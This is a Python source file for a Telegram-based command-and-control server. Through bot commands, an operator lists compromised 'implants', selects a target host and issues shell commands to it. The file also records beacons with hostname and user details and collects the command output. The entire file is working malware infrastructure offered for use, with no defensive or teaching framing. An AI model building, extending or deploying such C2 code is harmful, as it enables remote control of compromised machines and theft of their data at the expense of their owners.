# c2_frameworks/telegram/server.py
"""
Telegram C2 Server / Operator Console
One bot → multiple agents
Real-time command issuance, result collection, session tracking
"""

import asyncio
import base64
import json
from datetime import datetime
from typing import Dict, List, Optional

from telegram import Update, BotCommand
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

from .utils import encode_payload, decode_payload


class TelegramC2Server:
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.app = Application.builder().token(bot_token).build()
        
        # Active sessions: session_id → metadata
        self.sessions: Dict[str, Dict] = {}
        # Pending tasks: task_id → session_id
        self.pending_tasks: Dict[str, str] = {}
        self.task_counter = 0

        # Register commands
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("sessions", self.cmd_sessions))
        self.app.add_handler(CommandHandler("select", self.cmd_select))
        self.app.add_handler(CommandHandler("cmd", self.cmd_execute))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_raw_message))

        print("[+] Telegram C2 Server Ready")
        print("[+] Send /start to begin")

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🔥 Telegram C2 Server Online\n"
            "Use /sessions → list active implants\n"
            "/select <id> → target implant\n"
            "/cmd <command> → execute on selected implant"
        )

    async def cmd_sessions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.sessions:
            await update.message.reply_text("No active sessions.")
            return

        lines = ["🟢 Active Sessions:\n"]
        for sid, data in self.sessions.items():
            last = data.get("last_seen", "unknown")
            hostname = data.get("hostname", "unknown")
            user = data.get("user", "unknown")
            lines.append(f"• `{sid}` | {hostname}@{user} | Last: {last}")
        
        await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

    async def cmd_select(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /select <session_id>")
            return
        target = context.args[0]
        if target not in self.sessions:
            await update.message.reply_text("Session not found or offline.")
            return
        context.user_data["target"] = target
        info = self.sessions[target]
        await update.message.reply_text(
            f"✅ Target selected:\n"
            f"Host: {info['hostname']}@{info['user']}\n"
            f"Session: `{target}`", parse_mode="Markdown"
        )

    async def cmd_execute(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /cmd whoami")
            return
        target = context.user_data.get("target")
        if not target:
            await update.message.reply_text("No target selected. Use /select first.")
            return

        command = " ".join(context.args)
        task_id = f"T{self.task_counter:06d}"
        self.task_counter += 1

        payload = {
            "task_id": task_id,
            "command": command
        }
        encoded = encode_payload(payload)
        message = f"CMD:{encoded}"

        # Track pending task
        self.pending_tasks[task_id] = target

        await update.message.reply_text(f"🚀 Task {task_id} sent → {command}")
        await self.app.bot.send_message(chat_id=update.effective_chat.id, text=message)

    async def handle_raw_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = update.message.text.strip()

        # Handle beacon
        if text.startswith("ONLINE:"):
            try:
                encoded = text[7:]
                data = decode_payload(encoded)
                sid = data["session_id"]
                self.sessions[sid] = {
                    "hostname": data.get("hostname"),
                    "user": data.get("user"),
                    "platform": data.get("platform"),
                    "last_seen": datetime.utcnow().strftime("%H:%M:%S")
                }
                await update.message.reply_text(f"🟢 New beacon → {sid}")
            except:
                pass

        # Handle result
        elif text.startswith("RESULT:"):
            try:
                encoded = text[7:]
                result = decode_payload(encoded)
                task_id = result.get("task_id")
                output = result.get("output", "No output")

                # Clean up
                self.pending_tasks.pop(task_id, None)

                await update.message.reply_text(
                    f"📦 Result {task_id}\n\n"
                    f"```{output[:3500]}```",
                    parse_mode="Markdown"
                )
            except Exception as e:
                await update.message.reply_text(f"Parse error: {e}")

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            "/sessions - List live implants\n"
            "/select <id> - Choose target\n"
            "/cmd <command> - Execute shell command\n"
            "/help - This message"
        )
        await update.message.reply_text(help_text)

    def run(self):
        # Set bot commands
        commands = [
            BotCommand("start", "Start C2"),
            BotCommand("sessions", "List implants"),
            BotCommand("select", "Select target"),
            BotCommand("cmd", "Run command"),
        ]
        asyncio.run(self.app.bot.set_my_commands(commands))
        self.app.run_polling()


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Telegram C2 Server")
    parser.add_argument("--token", required=True, help="Your bot token")
    args = parser.parse_args()

    server = TelegramC2Server(args.token)
    server.run()